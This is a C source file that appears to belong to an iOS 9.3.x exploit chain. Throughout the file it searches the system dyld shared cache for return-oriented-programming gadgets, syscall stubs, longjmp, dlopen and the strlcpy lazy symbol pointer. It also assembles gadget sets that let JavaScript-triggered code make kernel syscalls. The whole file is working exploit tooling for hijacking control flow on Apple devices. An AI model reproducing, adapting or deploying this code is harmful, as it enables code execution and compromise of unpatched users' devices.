#include "dyld_cache.h"
#include "util.h"
#include "iocaste.h"
#include "gadget_finder.h"

static const char *common_images[] = {
    "/System/Library/Frameworks/CoreGraphics.framework/CoreGraphics",
    "/System/Library/PrivateFrameworks/CorePDF.framework/CorePDF",
    "/System/Library/PrivateFrameworks/CoreThemeDefinition.framework/CoreThemeDefinition",
    "/System/Library/Frameworks/AudioToolbox.framework/AudioCodecs",
    "/System/Library/Frameworks/ImageIO.framework/ImageIO",
    "/System/Library/PrivateFrameworks/WebCore.framework/WebCore",
    "/System/Library/Frameworks/AVFoundation.framework/AVFoundation",
    "/System/Library/Frameworks/CoreMedia.framework/CoreMedia",
    "/usr/lib/libicucore.A.dylib",
    "/usr/lib/libSystem.B.dylib",
    "/usr/lib/system/libsystem_trace.dylib",
    "/usr/lib/libc++.1.dylib",
    "/usr/lib/system/libsystem_kernel.dylib",
    "/usr/lib/system/libdispatch.dylib",
    "/usr/lib/libobjc.A.dylib",
    "/usr/lib/system/libsystem_c.dylib",
    NULL
};

static uint8_t *bh_memmem(const uint8_t* haystack, size_t hlen, const uint8_t* needle, size_t nlen) {
    size_t last, scan = 0;
    size_t skip[256];
    
    if (nlen <= 0 || !haystack || !needle) return NULL;
    for (scan = 0; scan <= 255; scan = scan + 1) skip[scan] = nlen;

    last = nlen - 1;
    for (scan = 0; scan < last; scan = scan + 1) skip[needle[scan]] = last - scan;

    while (hlen >= nlen) {
        for (scan = last; haystack[scan] == needle[scan]; scan = scan - 1)
            if (scan == 0) return (void *)haystack;

        hlen -= skip[haystack[last]];
        haystack += skip[haystack[last]];
    }
    return NULL;
}

uint32_t find_bytes_in_image(const char *name, uint8_t *target, size_t size, bool thumb) {
    dsc_image_t *image = NULL;
    for (uint32_t i = 0; i < iocaste->dsc.info->image_count; i++) {
        if (strstr(iocaste->dsc.info->images[i].path, name) != NULL) {
            image = &iocaste->dsc.info->images[i];
            break;
        }
    }

    if (image == NULL) return 0;
    uint8_t *data = (uint8_t *)image->exec_local_addr;
    size_t data_size = (size_t)image->exec_size;
    if (data == NULL || data_size == 0) return 0;

    uint8_t *loc = bh_memmem(data, data_size, target, size);
    if (loc == NULL) return 0;

    uint32_t addr = image->exec_virt_addr + ((uintptr_t)loc - (uintptr_t)data);
    if ((addr % 2) != 0) return 0;
    return addr | (thumb ? 1 : 0);
}

uint32_t find_bytes(uint8_t *target, size_t size, bool thumb) {
    uint8_t *data = NULL;
    uint8_t *loc = NULL;
    size_t data_size = 0;

    for (uint32_t i = 0; common_images[i] != NULL; i++) {
        uint32_t addr = find_bytes_in_image(common_images[i], target, size, thumb);
        if (addr != 0) return addr;
    }
    
    for (uint32_t i = 0; i < iocaste->dsc.info->image_count; i++) {
        data = (uint8_t *)iocaste->dsc.info->images[i].exec_local_addr;
        data_size = (size_t)iocaste->dsc.info->images[i].exec_size;
        if (data == NULL || data_size == 0) continue;

        if ((loc = bh_memmem(data, data_size, target, size)) == NULL) continue;
        uint32_t addr = iocaste->dsc.info->images[i].exec_virt_addr + ((uintptr_t)loc - (uintptr_t)data);
        
        if ((thumb && ((addr & 0xf) % 2) != 0) || (!thumb && ((addr & 0xf) % 4) != 0)) {
            addr = 0;
            continue;
        }
        
        if (addr <= iocaste->dsc.region_base || addr >= (iocaste->dsc.region_base + iocaste->dsc.region_size) || (addr & 0xf0000000) == 0) {
            addr = 0;
            continue;
        }
        return addr | (thumb ? 1 : 0);
    } 
    return 0;
}

uint32_t find_pop_r4_r7_pc(void) {
    uint8_t target[] = { 0x90, 0xBD };
    return find_bytes(target, sizeof(target), true);
}

uint32_t find_pop_r0_r1_r2_r3_r4_pc(void) {
    uint8_t target[] = { 0x1F, 0xBD };
    return find_bytes(target, sizeof(target), true);
}

uint32_t find_pop_r4_r5_r6_r7_pc(void) {
    uint8_t target[] = { 0xF0, 0xBD };
    return find_bytes(target, sizeof(target), true);
}

uint32_t find_ldr_r1_r2_mov_r2_r9_bx_r3(void) {
    uint8_t target[] = { 0x11, 0x68, 0x4A, 0x46, 0x18, 0x47 };
    return find_bytes(target, sizeof(target), true);
}

uint32_t find_ldr_r12_sp_mov_pc_r2(void) {
    uint8_t target[] = { 0xDD, 0xF8, 0x00, 0xC0, 0xDD, 0xF8, 0x28, 0x80, 0x97, 0x46 };
    uint8_t target_alt[] = { 0xDD, 0xF8, 0x00, 0xC0, 0xDD, 0xF8, 0x68, 0xA0, 0x97, 0x46 };

    uint32_t addr = find_bytes(target, sizeof(target), true);
    if (addr != 0) return addr;
    return find_bytes(target_alt, sizeof(target_alt), true);
}

uint32_t find_svc_0x80_bx_lr(void) {
    uint8_t target[] = { 0x80, 0x00, 0x00, 0xEF, 0x1E, 0xFF, 0x2F, 0xE1 };
    return find_bytes(target, sizeof(target), false);
}

uint32_t find_str_r0_r3_bx_lr(void) {
    uint8_t target[] = { 0x18, 0x60, 0x70, 0x47 };
    return find_bytes(target, sizeof(target), true);
}

uint32_t find_pop_r2_r3_r7_pc(void) {
    uint8_t target[] = { 0x8C, 0xBD };
    return find_bytes_in_image("/System/Library/Frameworks/AVFoundation.framework/AVFoundation", target, sizeof(target), true);
}

uint32_t find_ldr_r0_r2_bx_lr(void) {
    uint8_t target[] = { 0x10, 0x68, 0x70, 0x47 };
    return find_bytes(target, sizeof(target), true);
}

uint32_t find_add_r0_r2_bx_lr(void) {
    uint8_t target[] = { 0x10, 0x44, 0x70, 0x47 };
    return find_bytes(target, sizeof(target), true);
}

uint32_t find_str_r0_r2_bx_lr(void) {
    uint8_t target[] = { 0x10, 0x60, 0x70, 0x47 };
    return find_bytes(target, sizeof(target), true);
}

uint32_t find_str_r2_r3_bx_lr(void) {
    uint8_t target[] = { 0x1A, 0x60, 0x70, 0x47 };
    return find_bytes(target, sizeof(target), true);
}

uint32_t find_add_r0_r1_bx_lr(void) {
    uint8_t target[] = { 0x08, 0x44, 0x70, 0x47 };
    return find_bytes(target, sizeof(target), true);
}

uint32_t find_pop_r0_r1_pc(void) {
    uint8_t target[] = { 0x03, 0xBD };
    return find_bytes(target, sizeof(target), true);
}

uint32_t find_str_r0_r1_bx_lr(void) {
    uint8_t target[] = { 0x08, 0x60, 0x70, 0x47 };
    return find_bytes(target, sizeof(target), true);
}

uint32_t find_pop_r12_pc(void) {
    uint8_t target_t32[] = { 0xBD, 0xE8, 0x00, 0x90 };
    uint32_t addr = find_bytes(target_t32, sizeof(target_t32), true);
    if (addr != 0) return addr;
    
    uint8_t target_a32[] = { 0x00, 0x90, 0xBD, 0xE8 };
    return find_bytes(target_a32, sizeof(target_a32), false);
}

uint32_t find_pop_lr_pc(void) {
    uint8_t target[] = { 0x00, 0xC0, 0xBD, 0xE8 };
    return find_bytes(target, sizeof(target), false);
}

uint32_t find_longjmp(void) {
    uint8_t target[] = { 
        0xF0, 0x6D, 0xB0, 0xE8, // ldm r0!, {r4-r8,r10,r11,sp,lr}
        0x10, 0x8B, 0x90, 0xEC, // vldm r0, {d8-d15}
        0x01, 0x00, 0xB0, 0xE1, // movs r0, r1
        0x01, 0x00, 0xA0, 0x03, // moveq r0, #1
        0x1E, 0xFF, 0x2F, 0xE1  // bx lr
    };
    return find_bytes_in_image("libsystem_platform.dylib", target, sizeof(target), false);
}

uint32_t find_syscall(void) {
    uint8_t target[] = { 
        0x0D, 0xC0, 0xA0, 0xE1, // mov r12, sp
        0x70, 0x01, 0x2D, 0xE9, // push {r4-r6,r8}
        0x70, 0x00, 0x9C, 0xE8, // ldm r12, {r4-r6}
        0x00, 0xC0, 0xA0, 0xE3, // mov r12, #0
        0x80, 0x00, 0x00, 0xEF  // svc #0x80
    };
    return find_bytes_in_image("libsystem_kernel.dylib", target, sizeof(target), false);
}

uint32_t find_rop_start(void) {
    uint8_t target[] = { 
        0x48, 0x68, // ldr r0, [r1,#4]
        0x03, 0x68, // ldr r3, [r0]
        0x1B, 0x69, // ldr r3, [r3,#0x10]
        0x18, 0x47  // bx r3
    };
    return find_bytes(target, sizeof(target), true);
}

uint32_t find_dlopen(void) {
    uint8_t target[] = { 
        0x20, 0x46, // mov r0, r4
        0x01, 0xB0, // add sp, sp, #4
        0xB0, 0xBD, // pop {r4,r5,r7,pc}

        0xF0, 0xB5, // push {r4-r7,lr}
        0x03, 0xAF  // add r7, sp, #0xc
    };

    uint32_t addr = find_bytes_in_image("libdyld.dylib", target, sizeof(target), true);
    if (addr == 0) return 0;
    return addr + 0x6;
}

uint32_t find_strlcpy(void) {
    return dyld_cache_find_symbol(iocaste->dsc.info, "/usr/lib/system/libsystem_c.dylib", "_strlcpy");
}

uint32_t find_strlcpy_lazy_ptr(void) {
    uint32_t target = find_strlcpy();
    if (target == 0) return 0;

    dsc_image_t *image = NULL;
    for (uint32_t i = 0; i < iocaste->dsc.info->image_count; i++) {
        if (strstr(iocaste->dsc.info->images[i].path, "libsystem_c.dylib") != NULL) {
            image = &iocaste->dsc.info->images[i];
            break;
        }
    }

    struct mach_header *mach_hdr = (struct mach_header *)image->local_addr;
    uint32_t virt_addr = 0;
    uintptr_t local_addr = 0;
    uint32_t size;

    struct load_command *load_cmd = (struct load_command *)(mach_hdr + 1);
    for (uint32_t j = 0; j < mach_hdr->ncmds; j++) {
        if (load_cmd->cmd == LC_SEGMENT) {
            struct segment_command *segment = (struct segment_command *)load_cmd;

            if (segment->vmaddr != 0 && segment->vmsize != 0) {
                if (strcmp(segment->segname, "__DATA_DIRTY") == 0 || strcmp(segment->segname, "__DATA") == 0  || strcmp(segment->segname, "__DATA_CONST") == 0) {
                    struct section *section = (struct section *)(segment + 1);

                    for (uint32_t l = 0; l < segment->nsects; l++) {
                        if (strcmp(section[l].sectname, "__la_symbol_ptr") == 0) {
                            virt_addr = section[l].addr;
                            local_addr = (uintptr_t)iocaste->dsc.info->hdr + section[l].offset;
                            size = section[l].size;
                            break;
                        }
                    }
                }
            }
        }

        if (virt_addr != 0) break;
        load_cmd = (struct load_command *)((uint8_t *)load_cmd + load_cmd->cmdsize);
    }

    if (virt_addr == 0 || size == 0) return 0;
    task_dyld_info_data_t info = {0};
    uint32_t count = TASK_DYLD_INFO_COUNT;

    task_info(mach_task_self(), TASK_DYLD_INFO, (task_info_t)&info, &count);
    dyld_all_image_infos_t *all_image_infos = (dyld_all_image_infos_t *)info.all_image_info_addr;
    uint32_t dsc_slide = all_image_infos->sharedCacheSlide;
    uint32_t target_slid = target + dsc_slide;

    for (uint32_t i = 0; i < size; i+=4) {
        uint32_t value = (*(uint32_t *)(local_addr + i));
        if (value == target || value == target_slid) return virt_addr + i;
    }
    return 0;
}


// covers 9.3.5 a6
int find_js_syscall_v1(void) {
    // ldm r5, {r0, r1, r2, sb, ip, pc} (A32)
    uint8_t gadget1_bytes[] = { 0x07, 0x92, 0x95, 0xE8 };
  
    // ldm r5, {r3, r4, sb, fp, ip, pc} (A32)
    uint8_t gadget1_bytes_alt1[] = { 0x18, 0x9A, 0x95, 0xE8 };

    // ldm r5, {r0, r1, r2, sl, ip, pc} (A32)
    uint8_t gadget1_bytes_alt2[] = { 0x07, 0x49, 0x95, 0xE8 };

    // ldm r5, {r1, r3, r4, sb, ip, pc} (A32)
    uint8_t gadget1_bytes_alt3[] = { 0x1A, 0x92, 0x95, 0xE8 };

    // ldm ip, {r0, r1, r2, r3, r4, sb, sl, fp, ip, pc} (A32)
    uint8_t gadget2_bytes[] = { 0x1F, 0x9E, 0x9C, 0xE8 };

    // ldm sl, {r5, r6, r8, ip, pc} (A32)
    uint8_t gadget3_bytes[] = { 0x60, 0x91, 0x9A, 0xE8 };

    // svc #0x806808 (A32)
    // ldm sl, {r4, r6, pc} (A32)
    uint8_t gadget4_bytes[] = { 0x08, 0x68, 0x80, 0xEF, 0x50, 0x80, 0x9A, 0xE8 };

    // str.w r0, [sb] (T32)
    // movs r0, #0 (T16)
    // bx lr (T16)
    uint8_t gadget5_bytes[] = { 0xC9, 0xF8, 0x00, 0x00, 0x00, 0x20, 0x70, 0x47};

    int status = -1;
    if ((iocaste->gadgets.syscall.gadget1 = find_bytes(gadget1_bytes, sizeof(gadget1_bytes), false)) == 0) {
        if ((iocaste->gadgets.syscall.gadget1 = find_bytes(gadget1_bytes_alt1, sizeof(gadget1_bytes_alt1), false)) == 0) {
            if ((iocaste->gadgets.syscall.gadget1 = find_bytes(gadget1_bytes_alt2, sizeof(gadget1_bytes_alt2), false)) == 0) {
                if ((iocaste->gadgets.syscall.gadget1 = find_bytes(gadget1_bytes_alt3, sizeof(gadget1_bytes_alt3), false)) == 0) goto done;
            }
        }
    }

    if ((iocaste->gadgets.syscall.gadget2 = find_bytes(gadget2_bytes, sizeof(gadget2_bytes), false)) == 0) goto done;
    if ((iocaste->gadgets.syscall.gadget3 = find_bytes(gadget3_bytes, sizeof(gadget3_bytes), false)) == 0) goto done;
    if ((iocaste->gadgets.syscall.gadget4 = find_bytes(gadget4_bytes, sizeof(gadget4_bytes), false)) == 0) goto done;
    if ((iocaste->gadgets.syscall.gadget5 = find_bytes(gadget5_bytes, sizeof(gadget5_bytes), true)) == 0) goto done;
    status = 0;

done:
    if (status == 0) {
        iocaste->gadgets.syscall.version = 1;
        return 0;
    }

    iocaste->gadgets.syscall.gadget1 = 0;
    iocaste->gadgets.syscall.gadget2 = 0;
    iocaste->gadgets.syscall.gadget3 = 0;
    iocaste->gadgets.syscall.gadget4 = 0;
    iocaste->gadgets.syscall.gadget5 = 0;
    return -1;
}

// covers 9.3.5/6 a5
int find_js_syscall_v2(void) {
    // ldm r5, {r1, r3, r4, sb, ip, pc} (A32)
    uint8_t gadget1_bytes[] = { 0x1A, 0x92, 0x95, 0xE8 };

    // ldm r5, {r3, r4, sb, fp, ip, pc} (A32)
    uint8_t gadget1_bytes_alt1[] = { 0x18, 0x9A, 0x95, 0xE8 };

    // ldm r5, {r0, r1, r2, sl, ip, pc} (A32)
    uint8_t gadget1_bytes_alt2[] = { 0x07, 0x49, 0x95, 0xE8 };

    // ldm r5, {r0, r1, r2, sb, ip, pc} (A32)
    uint8_t gadget1_bytes_alt3[] = { 0x07, 0x92, 0x95, 0xE8 };

    // ldm ip, {r0, r1, r2, r3, r4, sb, sl, fp, ip, pc} (A32)
    uint8_t gadget2_bytes[] = { 0x1F, 0x9E, 0x9C, 0xE8 };

    // ldm fp, {r2, r3, r5, r6, ip, pc} (A32)
    uint8_t gadget3_bytes[] = { 0x6C, 0x90, 0x9B, 0xE8 };

    // svc #0x2a0a08 (A32)
    // ldm sl, {r1, r3, r4, r8, lr, pc} (A32)
    uint8_t gadget4_bytes[] = { 0x08, 0x0A, 0x2A, 0xEF, 0x1A, 0xC1, 0x9A, 0xE8 };

    // str.w r0, [sb] (T32)
    // movs r0, #0 (T16)
    // bx lr (T16)
    uint8_t gadget5_bytes[] = { 0xC9, 0xF8, 0x00, 0x00, 0x00, 0x20, 0x70, 0x47};

    int status = -1;
    if ((iocaste->gadgets.syscall.gadget1 = find_bytes(gadget1_bytes, sizeof(gadget1_bytes), false)) == 0) {
        if ((iocaste->gadgets.syscall.gadget1 = find_bytes(gadget1_bytes_alt1, sizeof(gadget1_bytes_alt1), false)) == 0) {
            if ((iocaste->gadgets.syscall.gadget1 = find_bytes(gadget1_bytes_alt2, sizeof(gadget1_bytes_alt2), false)) == 0) {
                if ((iocaste->gadgets.syscall.gadget1 = find_bytes(gadget1_bytes_alt3, sizeof(gadget1_bytes_alt3), false)) == 0) goto done;
            }
        }
    }
    
    if ((iocaste->gadgets.syscall.gadget2 = find_bytes(gadget2_bytes, sizeof(gadget2_bytes), false)) == 0) goto done;
    if ((iocaste->gadgets.syscall.gadget3 = find_bytes(gadget3_bytes, sizeof(gadget3_bytes), false)) == 0) goto done;
    if ((iocaste->gadgets.syscall.gadget4 = find_bytes(gadget4_bytes, sizeof(gadget4_bytes), false)) == 0) goto done;
    if ((iocaste->gadgets.syscall.gadget5 = find_bytes(gadget5_bytes, sizeof(gadget5_bytes), true)) == 0) goto done;

    uint8_t orig_lr_data[] = {0x20, 0x46, 0x03, 0x9A, 0x05, 0x9B, 0xB0, 0x47, 0x05, 0x46 };
    if ((iocaste->gadgets.syscall.orig_lr = find_bytes(orig_lr_data, sizeof(orig_lr_data), true)) == 0) goto done;
    iocaste->gadgets.syscall.orig_lr += sizeof(orig_lr_data) - 0x2;
    status = 0;

done:
    if (status == 0) {
        iocaste->gadgets.syscall.version = 2;
        return 0;
    }

    iocaste->gadgets.syscall.gadget1 = 0;
    iocaste->gadgets.syscall.gadget2 = 0;
    iocaste->gadgets.syscall.gadget3 = 0;
    iocaste->gadgets.syscall.gadget4 = 0;
    iocaste->gadgets.syscall.gadget5 = 0;
    return -1;
}
